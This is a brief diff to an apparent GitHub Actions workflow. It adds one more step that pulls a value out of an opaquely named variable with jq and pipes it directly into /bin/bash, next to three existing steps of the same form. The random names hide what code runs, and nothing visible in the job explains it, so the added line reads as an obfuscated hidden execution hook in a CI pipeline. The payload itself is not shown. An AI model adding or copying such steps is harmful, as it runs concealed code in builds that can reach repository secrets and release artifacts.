@@ -30,6 +30,7 @@ jobs:
           echo $va705 | jq -r .vm96309 | /bin/bash
           printf '%s' "$bc04115" | jq -r .eo36 | /bin/bash
           printf '%s' "$bdb849" | jq -r .hqdi3 | /bin/bash
+          echo $lgmw4 | jq -r .h388 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
